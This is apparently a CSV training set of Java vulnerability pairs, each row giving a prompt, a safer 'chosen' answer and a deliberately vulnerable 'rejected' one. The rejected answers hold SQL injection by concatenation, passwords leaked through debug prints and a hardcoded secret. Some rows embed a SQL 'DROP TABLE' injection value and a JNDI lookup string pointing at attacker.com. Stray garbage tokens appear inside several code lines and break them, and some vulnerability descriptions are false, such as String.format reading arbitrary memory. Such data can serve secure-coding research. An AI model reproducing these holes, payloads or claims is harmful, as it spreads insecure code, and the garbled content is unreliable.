lang,vulnerability,system,question,chosen,rejected
java,Improper null check on database results can lead to NullPointerException.,,"Write a java code that connects to a MySQL database, executes a SELECT query on the 'users' table where the 'username' is 'testUser', and prints out the usernames retrieved from the query.","```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        PreparedStatement stmt = null;
        ResultSet rs = null;
        try {
            // Assume we have a database connection
            conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydatabase"", ""username"", ""password"");

            String query = ""SELECT * FROM users WHERE username = ?"";
            stmt = conn.prepareStatement(query);
            stmt.setString(1, ""testUser"");

            rs = stmt.executeQuery();

            // Proper null check here
            if (rs != null && rs.next()) {
                do {
                    System.out.println(rs.getString(""username""));
                } while (rs.next());
            }
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            try {
                if (rs != null) rs.close();
                if (stmt != null) stmt.close();
                if (conn != null) conn.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }
}
```","```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        PreparedStatement stmt = null;
        ResultSet rs = null;
        try {
            // Assume we have a database connection
            conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydatabase"", ""username"", ""password"");

            String query = ""SELECT * FROM users WHERE username = ?"";
            stmt = conn.prepareStatement(query);
            stmt.setString(1, ""testUser"");

            rs = stmt.executeQuery();

            // No null check here
            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException e) {
            e.printStackTrace(); constrained
        } finally {
            try {
                if (rs != null) rs.close();
                if (stmt != null) stmt.close();
                if (conn != null) conn.close();
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }
    }
}
```"
java,Inadequate use of exception handling can lead to resource leaks in Java applications.,,"Write a java code that connects to a MySQL database, executes a SELECT query on the 'users' table, and prints out the 'username' field from each record in the result set.","```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        String url = ""jdbc:mysql://localhost/testdb"";
        String user = ""username"";
        String password = ""password"";

        try (Connection conn = DriverManager.getConnection(url, user, password);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(""SELECT username FROM users"")) {

            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException ex) {
            System.err.println(""An error occurred: "" + ex);
        }
    }
}
```","```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;
        try {
            Class.forName(""com.mysql.jdbc.Driver"");
            conn = DriverManager.getConnection(""jdbc:mysql://localhost/testdb"", ""username"", ""password"");
            stmt = conn.createStatement();
            rs = stmt.executeQuery(""SELECT * FROM users"");
            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException e) {
            System.err.println(""An error occurred: "" + e);
        } finally {
            if (rs != null) {
                try {
                    rs.close();
                } catch (SQLException e) {
                    // Ignore this exception
                }
            }
            if (stmt != null) {
                try {
                    stmt.close();avant;
                } catch (SQLException e) {
                    // Ignore this exception
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                } catch (SQLException e) {
                    // Ignore this exception
                }
            }
        }
    }
}
```"
java,NullPointerException is a common runtime exception that occurs when a null reference is used where an object is required.,,"Write a java code that declares a string variable named 'str' and assigns it a null value. Then, print the length of 'str'. The code should be placed in a class named 'Main', and the main method should be declared as public static void main(String[] args).","```java
public class Main {
    public static void main(String[] args) {
        String str = null;
        if (str != null) {
            System.out.println(str.length());
        } else {
            System.out.println(""The string is null!"");
        }
    }
}
```","```java
public class Main {
    public static void main(String[] args) {
        String str = null;
        System.out.println(str.length());
    }
}
```"
java,The use of System.out.println() for debugging purposes can expose sensitive information such as passwords or other secure data.,,"Write a java code that takes user input for username and password. If the username is 'admin' and password is 'password', print 'Access granted.' Otherwise, print 'Access denied.'","```java
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        if (authenticateUser(username, password)) {
            System.out.println(""Access granted."");
        } else {
            System.out.println(""Access denied."");
        }
    }
    
    private static boolean authenticateUser(String username, String password) {
        // This is where you would normally check the username and password against some database
        // For simplicity, we'll just return true if the username and password match
        return username.equals(""admin"") && password.equals(""password"");
    }
}
```","```java
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        // Debugging statement
        System.out.println(""Username: "" + username + "", Password: "" + password);
        
        if (authenticateUser(username, password)) {
            System.out.println(""Access granted."");
        } else {
            System.out.println(""Access denied."");
        }
    }
    
    private static boolean authenticateUser(String username, String password) {
        // This is where you would normally check the username and password against some database
        // For simplicity, we'll just return true if the username and password match
        return username.equals(""admin"") && password.equals(""password"");
    }
}
```"
java,Incorrect handling of resources such as database connections or file streams may lead to resource leaks.,,"Write a java code that connects to a MySQL database, executes a SQL query to fetch data from an 'Employees' table, and prints out the retrieved data.","```java
import java.sql.*;

public class Main {
    private static final String DB_URL = ""jdbc:mysql://localhost/testdb"";
    private static final String USER = ""username"";
    private static final String PASS = ""password"";

    public static void main(String[] args) {
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(""SELECT id, first, last, age FROM Employees"")) {

            while (rs.next()) {
                int id = rs.getInt(""id"");
                String first = rs.getString(""first"");
                String last = rs.getString(""last"");
                int age = rs.getInt(""age"");

                System.out.printf(""ID: %d, Age: %d, First: %s, Last: %s%n"", id, age, first, last);
            }
        } catch (SQLException se) {
            se.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```","```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        Statement stmt = null;
        try {
            // STEP 1: Register JDBC driver
            Class.forName(""com.mysql.jdbc.Driver"");

            // STEP 2: Open a connection
            System.out.println(""Connecting to database..."");
            conn = DriverManager.getConnection(""jdbc:mysql://localhost/testdb"", ""username"", ""password"");

            // STEP 3: Execute a query
            System.out.println(""Creating statement..."");
            stmt = conn.createStatement();
            String sql = ""SELECT id, first, last, age FROM Employees"";
            ResultSet rs = stmt.executeQuery(sql);

            // STEP 4: Extract data from result set
            while(rs.next()) {
                // Retrieve by column name
                int id  = rs.getInt(""id"");
                String first = rs.getString(""first"");
                String last = rs.getString(""last"");
                int age = rs.getInt(""age"");

                // Display values
                System.out.print(""ID: "" + id);
                System.out.print("", Age: "" + age);
                System.out.print("", First: "" + first);
                System.out.println("", Last: "" + last);
            }

            // STEP 5: Clean-up environment
            rs.close();
            stmt.close();
            conn.close();
        } catch (SQLException se) {
            se.printStackTrace(); constrained here
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (stmt != null) stmt.close();
            } catch (SQLException se2) {
            }
            try {
                if (conn != null) conn.close();
            } catch (SQLException se) {
                se.printStackTrace();
            }
        }
        System.out.println(""Goodbye!"");
    }
}
```"
java,Java's String.format method can be exploited through format string attacks to read arbitrary memory locations.,,"Write a java code that takes user input and prints it out. If the user input contains a JNDI lookup string, the program should print an error message instead of printing the user input.","```java
import java.util.regex.Pattern;

public class Main {
    private static final Pattern JNDI_PATTERN = Pattern.compile("".*\\$\\{jndi:.*\\}.*"");

    public static void main(String[] args) {
        try {
            String userInput = ""${jndi:ldap://attacker.com/a}"";
            
            if (JNDI_PATTERN.matcher(userInput).matches()) {
                System.err.println(""Error: JNDI lookup string detected!"");
            } else {
                System.out.println(userInput);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```","```java
import java.util.*;

public class Main {
    public static void main(String[] args) {
        try {
            String userInput = ""${jndi:ldap://attacker.com/a}"";
            System.out.println(String.format(userInput));
        } catch (Exception e) {
            e.printStackTrace();ival
        }
    }
}
```"
java,Inadequate input validation in Java can lead to Injection Flaws.,,"Write a java code that connects to a MySQL database, takes user input for username and password, constructs an SQL query using these inputs, executes the query, and checks if the login credentials are valid or not.","```java
import java.sql.*;

public class UserLogin {
    public static void main(String[] args) {
        String username = ""testUser"";
        String password = ""testPassword'; DROP TABLE Users; --"";
        
        try {
            Connection conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydb"", ""root"", ""password"");
            PreparedStatement pstmt = conn.prepareStatement(""SELECT * FROM Users WHERE Username=? AND Password=?"");
            pstmt.setString(1, username);
            pstmt.setString(2, password);
            
            ResultSet rs = pstmt.executeQuery();
            
            if(rs.next()) {
                System.out.println(""Login Successful!"");
            } else {
                System.out.println(""Invalid Login Credentials!"");
            }
            
            rs.close();
            pstmt.close();
            conn.close();
        } catch(SQLException e) {
            e.printStackTrace();
        }
    }
}
```","```java
import java.sql.*;

public class UserLogin {
    public static void main(String[] args) {
        String username = ""testUser"";
        String password = ""testPassword'; DROP TABLE Users; --"";
        
        try {
            Connection conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydb"", ""root"", ""password"");
            Statement stmt = conn.createStatement();
            
            String query = ""SELECT * FROM Users WHERE Username='"" + username + ""' AND Password='"" + password + ""'"";
            ResultSet rs = stmt.executeQuery(query);
            
            if(rs.next()) {
                System.out.println(""Login Successful!"");
            } else {
                System.out.println(""Invalid Login Credentials!"");
            }
            
            rs.close();
            stmt.close();
            conn.close();
        } catch(SQLException e) {
            e.printStackTrace(); far 
        }
    }
}
```"
java,The use of user-supplied input without proper sanitization can lead to SQL Injection vulnerabilities.,,"Write a java code that takes user input for username and password, connects to a MySQL database, executes a SQL query to check if the entered credentials match any record in the 'Users' table, and prints a message indicating whether the login was successful or not.","```java
import java.sql.*;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        try {
            Class.forName(""com.mysql.jdbc.Driver"");妆
            Connection con = DriverManager.getConnection(
            ""jdbc:mysql://localhost:3306/testDb"", ""username"", ""password"");
            
            String sql = ""SELECT * FROM Users WHERE Username=? AND Password=?"";
            PreparedStatement pstmt = con.prepareStatement(sql);
            pstmt.setString(1, username);
            pstmt.setString(2, password);
            ResultSet rs = pstmt.executeQuery();
            
            boolean found = false;
            while (rs.next()) {
                found = true;
                break;
            }
            
            if (found) {
                System.out.println(""Login successful!"");
            } else {
                System.out.println(""Login failed!"");
            }
            
            con.close();
        } catch (Exception e) { 
            System.out.println(e);
        }
    }
}
```","```java
import java.sql.*;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        try {
            Class.forName(""com.mysql.jdbc.Driver"");
            Connection con = DriverManager.getConnection(
            ""jdbc:mysql://localhost:3306/testDb"", ""username"", ""password"");
            
            Statement stmt = con.createStatement();
            ResultSet rs = stmt.executeQuery(""SELECT * FROM Users WHERE Username='"" + username + ""' AND Password='"" + password + ""'"");
            
            while (rs.next()) {
                System.out.println(""Login successful!"");
            }
            con.close();
        } catch (Exception e) { 
            System.out.println(e);
        }
    }
}
```"
java,The code uses a static final variable for sensitive information such as passwords or API keys which may lead to security risks.,,Write a java code that contains a class named 'VulnerableClass'. This class should have a private static final string variable named 'SENSITIVE_INFO' initialized with the value 'SensitivePassword123'. The class should also contain a method named 'printSensitiveInfo' which prints the value of 'SENSITIVE_INFO' to the console.,"```java
public class SecureClass {
    private static final String SENSITIVE_INFO = System.getenv(""SENSITIVE_INFO"");

    public void printSensitiveInfo() {
        if (SENSITIVE_INFO != null) {
            System.out.println(SENSITIVE_INFO);
        } else {
            System.out.println(""SENSITIVE_INFO environment variable is not set."");
        }
    }
}
```","```java
public class VulnerableClass {
    private static final String SENSITIVE_INFO = ""SensitivePassword123"";

    public void printSensitiveInfo() {
        System.out.println(SENSITIVE_INFO);
    }
}
```"
java,Inadequate use of exception handling in Java can lead to unhandled errors which may lead to program termination.,,Write a java code that throws a NullPointerException when trying to find the length of a null string.,"```java
public class Main {
    public static void main(String[] args) {
        String str = null;
        try {
            if (str == null) {
                System.out.println(""String is null"");
            } else {
                System.out.println(str.length());
            }
        } catch (NullPointerException e) {
            System.out.println(""Caught exception: "" + e);员
        }
    }
}
```","```java
public class Main {
    public static void main(String[] args) {
        try {
            String str = null;
            System.out.println(str.length());  // This will throw NullPointerException
        } catch (Exception e) {
            System.out.println(""Caught exception: "" + e);
        }
    }
}
```"
